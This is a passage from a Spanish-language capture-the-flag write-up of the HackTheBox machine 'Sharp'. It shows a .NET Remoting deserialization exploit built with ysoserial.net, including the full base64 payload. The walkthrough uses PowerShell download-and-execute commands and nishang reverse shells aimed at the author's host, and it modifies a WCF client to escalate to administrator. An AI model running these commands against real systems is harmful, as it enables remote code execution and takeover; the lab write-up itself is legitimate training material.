  <li><a href="https://portswigger.net/web-security/deserialization">Insecure deserialization</a>.</li>
  <li><a href="https://www.guru99.com/c-sharp-serialization.html"><strong>C# Sharp</strong> deserialization</a>.</li>
</ul>

<p>Entonces, clonamos el repo y nos apoyamos de <code>Visual Studio 2019</code> para compilar todo el proyecto. Abrimos el archivo <code>ExploitRemotingService.sln</code>, pueda que les pida un paquete de desarrollador (o no) as√≠ que simplemente le dan a la opci√≥n de descargar, lo descargan y vuelven a abrir el proyecto. (Pues eso tuve que hacer yo :P). Ahora si compilan y se nos crea el ejecutable en la ruta: <code>C:\htb_sharp\files\ExploitRemotingService\ExploitRemotingService\bin\Debug</code>, ve√°moslo:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService.exe
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_exploitremotingserviceEXE.png" alt="303win_cmd_exploitremotingserviceEXE" /></p>

<p>Perfecto, de los que nos pide tenemos:</p>

<ul>
  <li>URI: <code>tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint</code>.</li>
  <li>‚Äìuser: <code>debug</code>.</li>
  <li>‚Äìpass: <code>SharpApplicationDebugUserPassword123!</code>.</li>
</ul>

<p>Asi que su ejecuci√≥n debe ser:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService.exe tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint -s --user=debug --pass="SharpApplicationDebugUserPassword123!" ver
Error, couldn't detect version, using host: 4.0.30319.42000
Detected version 4 server
...

Server stack trace:
...
</code></pre>

<p>Pero obtenemos bastantes errores locochones (aunque nos respondi√≥ con una versi√≥n), jmmm‚Ä¶ Leyendo que m√°s podemos hacer con el exploit, vemos la opci√≥n de enviar un objeto serializado haciendo uso del par√°metro <code>raw</code>. Pero como generamos ese objeto? Bueno, buscando tenemos la herramienta <code>ysoserial</code>, la cual como su descripci√≥n indica, explota aplicaciones que efect√∫an deserializacion insegura de objetos.</p>

<p>Adem√°s tenemos el repositorio <code>ysoserial.net</code> que nos ayudara a hacer el proceso con un ejecutable de Windows:</p>

<ul>
  <li><a href="https://github.com/pwntester/ysoserial.net/">github.com/pwntester/ysoserial.net</a>.</li>
</ul>

<p>Hacemos el mismo proceso que antes, abrimos el archivo <code>ysoserial.sln</code>, compilamos y tenemos el binario:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe
</code></pre>

<p>‚Ä¶</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_ysoserialEXE.png" alt="303win_cmd_ysoserialEXE" /></p>

<p>‚Ä¶</p>

<p>Entonces, generemos el objeto, <code>ysoserial</code> tiene varios <strong>gadgets</strong> y <strong>plugins</strong>, usaremos el <strong>gadget</strong> llamado <code>TypeConfuseDelegate</code>:</p>

<pre><code class="language-powershell">(*) TypeConfuseDelegate
        Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
</code></pre>

<p>Haremos que el formato sea <strong>BinaryFormatter</strong>, guardaremos el output en formato <strong>base64</strong> y finalmente ingresaremos los comandos que queremos ejecutar en el proceso de deserializacion, todo quedar√≠a as√≠:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34:8000/P.ps1')"
</code></pre>

<blockquote>
  <p>Esto nos generara una cadena en <code>base64 </code> que sera nuestro payload y sera el que adjuntemos al paramentro <code>raw</code> de <code>ExploitRemotingService</code>.</p>
</blockquote>

<p>Donde <code>P.ps1</code> es el archivo <code>Invoke-PowerShellTcp.ps1</code> del <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">repositorio nishang</a>, el cual nos brinda un mont√≥n de herramientas basadas en PowerShell.</p>

<p>En nuestro caso y en el de ese archivo, nos permite indicarle que genere una reverse Shell, para esto debemos modificar una l√≠nea:</p>

<pre><code class="language-powershell">function Invoke-PowerShellTcp 
{ 
&lt;#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
...
</code></pre>

<p>Tomamos la ultima linea y la agregamos al final del archivo pero sin el <code>PS &gt;</code> y la modificamos con nuestra IP y puerto:</p>

<pre><code class="language-powershell">...
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.34 -Port 4433
</code></pre>

<p>Entonces lo que har√° esto es muy sencillo, una vez estemos en escucha donde tengamos este archivo lanzamos el payload el cual claramente tambi√©n estar√° apuntando a este archivo. Una vez se reciba la petici√≥n el servidor leer√° toooooodo el archivo y como la √∫ltima l√≠nea est√° en forma de instrucci√≥n, el sistema la ejecutara, lo que quiere decir que ejecutara nuestra reverse Shell hacia el puerto <code>4433</code>. D√©mosle‚Ä¶</p>

<p>Breveeeees e.e Pong√°monos primero en escucha por el puerto <code>4433</code>:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\nc.exe -lvp 4433
listening on [any] 4433 ...
</code></pre>

<p>Ahora creemos el servidor web donde esta nuestro archivo <code>P.ps1</code>:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; dir

    Directorio: C:\htb_sharp\files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----    08/02/2021  10:52 a. m.                ExploitRemotingService
d-----    08/02/2021  01:30 p. m.                nishang
d-----    08/02/2021  12:21 p. m.                ysoserial.net
-a----    26/01/2021  11:07 a. m.           5632 Client.exe
-a----    08/02/2021  01:34 p. m.           4533 P.ps1
-a----    26/01/2021  11:07 a. m.           4096 RemotingLibrary.dll
-a----    26/01/2021  11:07 a. m.           6144 Server.exe

PS C:\htb_sharp\files&gt; c:reteteteu_u\Python\Python39\python.exe -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
</code></pre>

<p>Perfecto, ahora solo nos quedar√≠a ejecutar el payload, generemos la cadena en <code>base64</code> con <strong>ysoserial</strong>:</p>

<blockquote>
  <p>Asegurense de desactivar todo lo que implique <code>firewall</code>, tuve algunos problemas por eso :P</p>
</blockquote>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34:8000/P.ps1')"
AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAF4vYyBwb3dlcnNoZWxsIC1jIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMzQ6ODAwMC9QLnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
</code></pre>

<p>Y ahora <strong>ExploitRemotingService</strong>:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService.exe tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint -s --user="debug" --pass="SharpApplicationDebugUserPassword123!" raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAF4vYyBwb3dlcnNoZWxsIC1jIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMzQ6ODAwMC9QLnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
</code></pre>

<p>En consola obtenemos:</p>

<pre><code class="language-powershell">System.InvalidCastException: Unable to cast object of type 'System.Collections.Generic.SortedSet`1[System.String]' to type 'System.Runtime.Remoting.Messaging.IMessage'.
   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)
   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage&amp; responseMsg, ITransportHeaders&amp; responseHeaders, Stream&amp; responseStream)
</code></pre>

<p>Pero que pasa, como toda deserializaci√≥n, el proceso falla, pero no nos interesa, porque nuestro c√≥digo se ejecut√≥ antes que el error, por lo tanto nosotros ya hemos conseguido una sesi√≥n:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_exploitremotingserviceEXE_revsh.png" alt="303win_cmd_exploitremotingserviceEXE_revsh" /></p>

<p>Tamos en el sistema como <code>lars</code> y tenemos acceso a la flag <code>user.txt</code> :)</p>

<p>Enumeremos para ver como escalar privilegios‚Ä¶</p>

<p>‚Ä¶</p>

<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>

<p>Recorriendo la m√°quina encontramos unos archivos en <code>c:\Users\lars\Documents</code>:</p>

<pre><code class="language-powershell">c:\Users\lars\Documents&gt;dir
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents

02/08/2021  07:35 PM    &lt;DIR&gt;          .
02/08/2021  07:35 PM    &lt;DIR&gt;          ..
11/15/2020  01:40 PM    &lt;DIR&gt;          wcf
               0 File(s)              0 bytes
               3 Dir(s)  32,343,658,496 bytes free

c:\Users\lars\Documents&gt;dir wcf
dir wcf
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents\wcf

11/15/2020  01:40 PM    &lt;DIR&gt;          .
11/15/2020  01:40 PM    &lt;DIR&gt;          ..
11/15/2020  01:40 PM    &lt;DIR&gt;          .vs
11/15/2020  01:40 PM    &lt;DIR&gt;          Client
11/15/2020  01:40 PM    &lt;DIR&gt;          packages
11/15/2020  01:40 PM    &lt;DIR&gt;          RemotingLibrary
11/15/2020  01:41 PM    &lt;DIR&gt;          Server
11/15/2020  12:47 PM             2,095 wcf.sln
               1 File(s)          2,095 bytes
               7 Dir(s)  32,343,658,496 bytes free

c:\Users\lars\Documents&gt;
</code></pre>

<p>Si le damos un vistaso al cliente (como hicimos al inicio) vemos:</p>

<pre><code class="language-powershell">c:\Users\lars\Documents&gt;cd wcf\Client
c:\Users\lars\Documents\wcf\Client&gt;dir
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents\wcf\Client

11/15/2020  01:40 PM    &lt;DIR&gt;          .
11/15/2020  01:40 PM    &lt;DIR&gt;          ..
11/14/2020  11:14 PM               184 App.config
11/15/2020  01:40 PM    &lt;DIR&gt;          bin
11/15/2020  01:36 PM             2,639 Client.csproj
11/15/2020  01:40 PM    &lt;DIR&gt;          obj
11/15/2020  01:39 PM               625 Program.cs
11/15/2020  01:40 PM    &lt;DIR&gt;          Properties
               3 File(s)          3,448 bytes
               5 Dir(s)  32,343,658,496 bytes free
</code></pre>

<pre><code class="language-powershell">c:\Users\lars\Documents\wcf\Client&gt;type Program.cs
</code></pre>

<pre><code class="language-cs">using RemotingSample;
using System;
using System.ServiceModel;

namespace Client {

    public class Client
    {
        public static void Main() {
            ChannelFactory&lt;IWcfService&gt; channelFactory = new ChannelFactory&lt;IWcfService&gt;(
                new NetTcpBinding(SecurityMode.Transport),"net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint"
            );
            IWcfService client = channelFactory.CreateChannel();
            Console.WriteLine(client.GetDiskInfo());
            Console.WriteLine(client.GetCpuInfo());
            Console.WriteLine(client.GetRamInfo());
        }
    }
}
c:\Users\lars\Documents\wcf\Client&gt;
</code></pre>

<p>Tiene practicamente la misma estructura que el anterior cliente, pero lo interesante de esto es su propietario:</p>

<pre><code class="language-powershell">c:\Users\lars\Documents\wcf\Client&gt;dir /q *
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents\wcf\Client

11/15/2020  01:40 PM    &lt;DIR&gt;          BUILTIN\Administrators .
11/15/2020  01:40 PM    &lt;DIR&gt;          BUILTIN\Administrators ..
11/14/2020  11:14 PM               184 BUILTIN\Administrators App.config
11/15/2020  01:40 PM    &lt;DIR&gt;          BUILTIN\Administrators bin
11/15/2020  01:36 PM             2,639 BUILTIN\Administrators Client.csproj
11/15/2020  01:40 PM    &lt;DIR&gt;          BUILTIN\Administrators obj
11/15/2020  01:39 PM               625 BUILTIN\Administrators Program.cs
11/15/2020  01:40 PM    &lt;DIR&gt;          BUILTIN\Administrators Properties
               3 File(s)          3,448 bytes
               5 Dir(s)  32,343,658,496 bytes free

c:\Users\lars\Documents\wcf\Client&gt;
</code></pre>

<p>Lo que quiere decir que lo que se est√© ejecutando, ser√° ¬´ejecutado¬ª con privilegios de administrador. Intentemos modificar el archivo <code>Client.exe</code>, pero para eso debemos mover todo el directorio (por tema de librer√≠as, llamados, etc.) a nuestra m√°quina para agregar lo que necesitemos y posteriormente compilar y volver a subir los objetos.</p>

<p>Podemos generar un comprimido de todo para facilitarnos la transferencia, aprovechamos el uso de <code>PowerShell</code> y la herramienta <a href="https://superuser.com/questions/201371/create-zip-folder-from-the-command-line-windows">Compress-Archive</a> para hacerlo:</p>

<pre><code class="language-powershell">PS C:\Users\lars\Documents&gt; Compress-Archive wcf c:\dev\out.zip
PS C:\Users\lars\Documents&gt; dir c:\dev

    Directory: C:\dev

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/15/2020  10:25 AM           5632 Client.exe
-a----       11/15/2020   1:59 PM             70 notes.txt
-a----         2/8/2021  11:36 PM       11598452 out.zip
-a----       11/15/2020  10:25 AM           4096 RemotingLibrary.dll
-a----       11/16/2020  11:55 AM           6144 Server.exe
</code></pre>

<p>Pero‚Ä¶ ¬øPor qu√© sobre la ruta <code>dev/</code>? Bueno, si recordamos, los archivos <code>Client.exe</code>, <code>Server.exe</code> y <code>notes.txt</code> los obtuvimos mediante <code>SMB</code> con el usuario <code>lars</code> sobre la carpeta compartida <code>dev/</code>. Lo que quiere decir que seguimos teniendo acceso a ella, solo que ahora lo haremos desde Windows.</p>

<p>Abrimos la conexi√≥n sobre la unidad <code>Z:</code> ahora:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_netuseDEVshare.png" alt="303win_cmd_netuseDEVshare" /></p>

<p>Validamos:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; net use
No se recordar√°n las nuevas conexiones.

Estado       Local     Remoto                    Red

-------------------------------------------------------------------------------
Conectado    Z:        \\10.10.10.219\dev        Microsoft Windows Network
Se ha completado el comando correctamente.
</code></pre>

<ul>
  <li><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)">Info sobre el uso de <strong>net use</strong></a>.</li>
</ul>

<p>Perfecto, ahora simplemente validamos que tengamos los archivos:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; dir z:

    Directorio: z:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----    15/11/2020  05:25 a. m.           5632 Client.exe
-a----    15/11/2020  08:59 a. m.             70 notes.txt
-a----    08/02/2021  06:36 p. m.       11598452 out.zip
-a----    15/11/2020  05:25 a. m.           4096 RemotingLibrary.dll
-a----    16/11/2020  06:55 a. m.           6144 Server.exe
</code></pre>

<p>Tenemos el comprimido, ahora si a jugar :)</p>

<p>Descomprimimos y abrimos el archivo <code>wcf.sln</code> con <code>Visual Studio</code>:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_vs_wcfSLN.png" alt="303win_vs_wcfSLN" /></p>

<p>Detallamos que al ser ejecutado, muestra info del sistema; informaci√≥n del disco, de la CPU y la RAM :I</p>

<pre><code class="language-powershell">Console.WriteLine(client.GetDiskInfo());
Console.WriteLine(client.GetCpuInfo());
Console.WriteLine(client.GetRamInfo());
</code></pre>

<p>Probemos ahora a agregar una linea que nos genere una nueva Reverse Shell, pero ahora ser√° como <code>Administrator</code> (ojala :P).</p>

<pre><code class="language-c">//Podemos simplemente invocar PowerShell usando el cliente que ya esta definido
Console.WriteLine(client.InvokePowerShell("IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34:8000/P.ps1')"));
</code></pre>

<p>Ahora el codigo quedaria:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_vs_wcfSLN_clientMOD.png" alt="303win_vs_wcfSLN_clientMOD" /></p>

<p>Compilamos :O</p>

<pre><code class="language-powershell">1&gt;------ Operaci√≥n Compilar iniciada: proyecto: RemotingLibrary, configuraci√≥n: Debug Any CPU ------
1&gt;  RemotingLibrary -&gt; C:\htb_sharp\files\wcfCompress\wcf\RemotingLibrary\bin\Debug\WcfRemotingLibrary.dll
2&gt;------ Operaci√≥n Compilar iniciada: proyecto: Client, configuraci√≥n: Debug Any CPU ------
2&gt;  Client -&gt; C:\htb_sharp\files\wcfCompress\wcf\Client\bin\Debug\WcfClient.exe
========== Compilar: 2 correctos, 0 incorrectos, 0 actualizados, 0 omitidos ==========
</code></pre>

<p>Perfe, antes de pasar los archivos (m√°s que todo por que me acorde y despues de me olvida :P), modifiquemos el objeto <code>P.ps1</code> para que apunte a otro puerto por ejemplo el <code>4435</code>.</p>

<pre><code class="language-powershell">...
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.34 -Port 4435
</code></pre>

<p>Pongamonos en escucha:</p>

<pre><code class="language-powershell">PS C:\htb_sharp\files&gt; .\nc.exe -lvp 4435
listening on [any] 4435 ...
</code></pre>

<p>Movamoslos:</p>

